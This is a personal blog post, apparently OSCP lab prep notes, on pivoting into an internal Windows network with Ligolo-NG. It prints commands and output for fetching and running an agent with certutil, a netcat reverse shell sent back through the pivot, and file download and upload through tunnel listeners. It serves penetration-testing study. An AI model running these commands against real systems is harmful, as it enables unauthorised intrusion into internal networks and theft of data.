<h2 class="menu-header" id="main">
<a href="https://github.com/Mithlonde/Mithlonde">Root</a>&#xA0;&#xA0;&#xA0;
<a href="https://github.com/Mithlonde/Mithlonde/blob/main/blog/index.md">~/Blog</a>&#xA0;&#xA0;&#xA0;
<a href="https://github.com/Mithlonde/Mithlonde/blob/main/projects/index.md">Projects</a>&#xA0;&#xA0;&#xA0;
<a href="https://github.com/Mithlonde/Mithlonde/blob/main/all-writeups.md">Writeups</a>&#xA0;&#xA0;&#xA0;
</h2>

# 👾 Mithlonde
└─$ cat blog/tunneling.md

[Kali] <----> [**Pivot Box/MS01**] <----> [Internal Boxes/MS02/DC01]

# Network Pivoting with Ligolo-NG:
In this video, Gonski Cyber shows how you can use Ligolo-NG to setup simple network pivots for use in your OSCP prep and use Ligolo's handy listener functionality to transfer files and receive reverse shell connections from machines on internal networks! 
- https://www.youtube.com/watch?v=DM1B8S80EvQ

I think by design. In order to get revshell connections and initiate file transfers from MS02 (when you are pivoting thru MS01) it requires a reverse port forward. Ligolo-NG has great functionality that makes this really easy.

So if we find ourselves in a situation where we have a pivot setup to the internal network, but the internal machine cant send back a shell to our attack box, we can use ligolo's TCP listeners to get our shell back on our kali box!

Here's a excerpt from my notes on this.

We need:
- Ligolo proxy file for our kali machine
- Ligolo agent file for our pivot/jump host (download this to target)
-> Precompiled binaries (Windows/Linux/macOS) are available on the [Release page](https://github.com/nicocha30/ligolo-ng/releases).
use `tar xzg file.tar.gz`

```
# On Kali:
`sudo ip tuntap add user [your_username] mode tun ligolo`
`sudo ip link set ligolo up`
`sudo ./proxy -selfcert`
`Pythonserver`

# On MS01:
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
`certutil -urlcache -split -f http://kali:8000/agent.exe agent.exe`
`.\agent.exe -connect 192.168.45.154:11601 -ignore-cert`

    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng » INFO[0338] Agent joined.                                 name="MS01\\Administrator@MS01" remote="192.168.235.147:65421"
ligolo-ng » `session`
? Specify a session : `1` - MS01\Administrator@MS01 - 192.168.235.147:65421
[Agent : MS01\Administrator@MS01] » `ifconfig`
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:ba:33:16              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.235.147/24             │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:ba:9d:50              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ `10.10.125.147/24`             │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘

# From Kali: `sudo ip route add 10.10.125.0/24 dev ligolo`

# Back in Proxy:
[Agent : MS01\Administrator@MS01] » `session`
? Specify a session : `1`- MS01\Administrator@MS01 - 192.168.235.147:65421
[Agent : MS01\Administrator@MS01] » `start`
[Agent : MS01\Administrator@MS01] » INFO[0780] Starting tunnel to MS01\Administrator@MS01

# Back in Kali (if this can resolve it's working):
`NetExec smb 10.10.125.0/24`
SMB         10.10.125.147   445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:oscp.demo) (signing:False) (SMBv1:False)
SMB         10.10.125.146   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:oscp.demo) (signing:True) (SMBv1:False)
SMB         10.10.125.148   445    MS02             [*] Windows 10.0 Build 19041 x64 (name:MS02) (domain:oscp.demo) (signing:False) (SMBv1:False)

From our kali, we can now also scan for the top ports using the following command:
nmap -sT --top-ports=100 -T4 -Pn -PE $IP

# Add listerener
# Back in Proxy
[Agent : MS01\Administrator@MS01] » listener_list
┌─────────────────────────────────────────────────────────────┐
│ Active listeners                                            │
├───┬───────┬────────────────────────┬────────────────────────┤
│ # │ AGENT │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼───────┼────────────────────────┼────────────────────────┤
└───┴───────┴────────────────────────┴────────────────────────┘
[Agent : MS01\Administrator@MS01] » `listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444`
INFO[1465] Listener created on remote agent!
[Agent : MS01\Administrator@MS01] » listener_list
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ MS01\Administrator@MS01 │ 0.0.0.0:1234           │ 127.0.0.1:4444         │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘
(Any connection coming in on port 1234 on MS01 will be redirected to us on our localhost 4444)

Next, to have MS02 call back to us, we point any connection coming from MS02 to the MS01 `10.10.125.147/24` internal IP address and port `1234` 

# Example: 
# From MS02: `nc.exe 10.10.125.147 1234 -e cmd`
# On Kali: `rlwrap nc -lvnp 4444`
mithlonde@kali:~$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33684
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

c:\Users\Public>hostname
hostname
MS02

# Set up file transfer listener
# Back in Proxy
[Agent : MS01\Administrator@MS01] » listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
INFO[2426] Listener created on remote agent!            
[Agent : MS01\Administrator@MS01] » listener_list
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ MS01\Administrator@MS01 │ 0.0.0.0:1234           │ 127.0.0.1:4444         │
│ 1 │ MS01\Administrator@MS01 │ 0.0.0.0:1235           │ 127.0.0.1:80           │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘
(Any connection coming in on port 1235 on MS01 will be redirected to our Python HTTP Server on our localhost on port 80)

# To summarize
Reverse shells: MS02 -> MS01 on 10.10.125.147:1234 -> Kali:4444
   -> `nc.exe 10.10.125.147 1234 -e cmd`
   -> `rlwrap nc -lnvp 4444`
File transfers: MS02 -> MS01 on 10.10.125.147:1235 -> Kali:80
   -> `python3 -m http.server 80`
   -> `certutil -urlcache -split -f http://10.10.125.147:1235/nc.exe nc.exe`
   -> `python3 -m uploadserver 80`
   -> `curl -X POST http://10.10.125.147:1235/upload -F 'files=@uploadtest.php'`
   
# Cleaning up
[Agent : MS01\Administrator@MS01] » stop
[Agent : MS01\Administrator@MS01] » INFO[8371] Closing tunnel to MS01\Administrator@MS01...
[Agent : MS01\Administrator@MS01] » listener_list
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ MS01\Administrator@MS01 │ 0.0.0.0:1234           │ 127.0.0.1:4444         │
│ 1 │ MS01\Administrator@MS01 │ 0.0.0.0:1235           │ 127.0.0.1:80           │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘
[Agent : MS01\Administrator@MS01] » listener_stop 1
INFO[8410] Listener closed.                             
[Agent : MS01\Administrator@MS01] » listener_stop 0
INFO[8412] Listener closed.
[Agent : MS01\Administrator@MS01] » listener_list
┌─────────────────────────────────────────────────────────────┐
│ Active listeners                                            │
├───┬───────┬────────────────────────┬────────────────────────┤
│ # │ AGENT │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼───────┼────────────────────────┼────────────────────────┤
└───┴───────┴────────────────────────┴────────────────────────┘
# From Kali:
sudo ip link set ligolo down
sudo ip tuntap delete mode tun ligolo
sudo ip route delete 10.10.125.0/24 dev ligolo
ip a && ip route
```
